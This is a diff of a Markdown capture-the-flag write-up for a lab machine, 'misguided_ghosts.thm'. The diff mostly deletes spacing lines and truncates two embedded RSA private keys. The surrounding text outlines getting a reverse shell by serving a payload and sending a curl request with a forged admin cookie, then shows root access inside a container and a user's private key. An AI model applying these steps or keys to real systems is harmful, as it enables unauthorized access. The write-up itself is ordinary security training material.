@@ -521,9 +521,6 @@ https://misguided_ghosts.thm:8080/console              (Status: 200) [Size: 1985
 <br>
 <br>
 <p align="center">Craft a payload like <strong>rev.sh</strong>. Set up an HTTP server. Set up a listener. Navigate to the two paths below. Get the shell.</p>
-
-<br>
-<br>
 <h6 align="center">rev.sh</h6>
 
 ```bash
@@ -589,7 +586,6 @@ Connection: keep-alive
 ```
 
 <br>
-<br>
 <p align="center">Practice also using <strong>curl</strong>.</p>
 
 ```bash
@@ -601,7 +597,6 @@ $ curl -s -k -b 'login=hayley_is_admin' 'https://misguided_ghosts.thm:8080/photo
 ```
 
 <br>
-<br>
 <h1 align="center">Initial Foothold<a id='11'></a></h1>
 
 ```bash
@@ -612,22 +607,17 @@ id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-<br>
 <p align="center">Note that there´s no Python available.</p>
 
 ```bash
 which python3
 ```
 
-<br>
-<br>
-
 ```bash
 pwd
 /var/www/https
 ```
 
-<br>
 <p align="center">Note <strong>Dockerfile</strong> and <strong>start.sh</strong>.</p>
 
 ```bash
@@ -684,29 +674,7 @@ I know you can never remember your password, so I left your private key here so 
 cat .id_rsa
 -----BEGIN RSA PRIVATE KEY-----
 NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
-CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
-0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
-aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
-TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
-QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
-a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
-4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
-DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
-cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
-gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
-mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
-wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
-A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
-VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
-ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
-oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
-LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
-H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
-M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
-vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
-eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
-1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
-r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
+...
 VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
 -----END RSA PRIVATE KEY-----
 ```
@@ -717,29 +685,7 @@ VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
 ```bash
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEApya9l8m0cxfGexe0nmh1LHt0R91uXON/B5Ob15aSdl2NtOzB
-XvIGUrxCqDjeDwl4tnlrOTX3uvRT2dW8XzI6Ql9dI6p8eDcxNMd2/QYRcxdReBMz
-0U/v9Z5yPqhDoKX62QJeVMLNs7Bo0llI5fNRusk0MKhTigM6rHFFbIwCJvOVXPr6
-wSND7qniKIoEwewCKK7ZvedMxpZOFg/CjT9Tf/qC2zEyo7F0F0kFUov7iOd79KO0
-ZdHw61/U7xiQUXdB8jvTUqb45S0rno5ju0akIrvVkyE5C3kEVOZyhB0aiIEVtarR
-FS8WPQxmK6GlTUK7onCF7ckPL5ZQo4An6H3lMQIDAQABAoIBAEq1ehAZy1mVytTB
-p60VqymSlEp6ohVKaUCNrR4S4quc7PVszJEPQ9w+4Nwnbrjx1s5YPqB3ip45DjFS
-4rr5zChWT17dmHxyzr90V66Hw8zZI0Sz8HkhbXMuuole07s99HyCHn9sAlzKAE/k
-MDz3IBSIUZdd5NjO0K66gfkeKugVRdlQFUIAIvYzuYjpxsYETmTE3B4wJ00utHAH
-xMeoW+BaIdnSkT6IcIbWAsnfw8Ytq0RP9Jxt+pIIApsWquSy+0TJVxgpXsNaPECt
-iXACk7havOwodHyd1FCH8nkhq9qcZ5GwaZoNyt6ePjmxLG8PZCeP5DlsvIDYqbdi
-sdYt+AECgYEA3Wh/1Zz8Je4HGpt3U7huBOeuGvzf/b2V2sw4yUqUUE8Btx6XQ8Mm
-fa2TU1VUfUKQeF2kY1PyEbSiTe/gA1Q3GHqT7e6qN+JHk7i5QjbFhq/cBPGgH3w1
-Z1Vy4ENIR0GAfmfzNvPIsUKpbPRHN4A0KnPiU/Ej8ei6NZfRH0+topECgYEAwUQr
-UA1HIXFjVReDnBlNJhxfgmyaDQWpxkFyq8w4G8LD/U7dBr56ilP6eqasK3n19P6w
-ysqbU8zCT6F8hwRUrszy6u+Sa4gmPBtNnSbZzoWpDxxw1qzInyUHhhQMZoT7MDpi
-qNONkx6X/3luBZ+B+LPi3cK+3J/+TrayRiakKKECgYEApy90cAnVgJKnPJkuVsKK
-GRwUpP5T6RdSY+AX9S9ipO2zvuHTmPBwTTBXcfKaFOfBjZIwQmyt+l6qvC0ou3rJ
-C6vrrhus3vv3zn0LLwuKxfRfMECAB6ZT8Q5d6ygDGQNGEq1Nwy38WpWat9IRQMCH
-I5NT0MzitpVknnlgCMOyunECgYB9pYL/LVK0NFJe7MWcg3p7r3CMi2xv0OG6Saxy
-cnd73NisY0wg6U8jhUtP1/IQ5d54o+huPuBSz8j4GkWqRa+EYSwAfzZTAJXS9/Ey
-nSJ3OMBbWaMmffiENn+4tGoHcKcZiKvBlJ/zKK2q4tgbgcLu3Iw+njCVoNKle/NU
-1iRdYQKBgDK3Rx8li9HHRb8PC6Q6/mFv1wEBbYaOpbBui7N/ecRf04e7KfH80Zbc
-q8CwTGoba3+lVzh+lo1xG6SvC9e7YK5q9AKHZFTa/3XsWp+mPkrl39swj8POcxVP
+...
 CdKPW4yuLZtp0ypGlAmL6F5ovJmqHj18PMGIG1bmn1E68uSJVEhl
 -----END RSA PRIVATE KEY-----
 ```
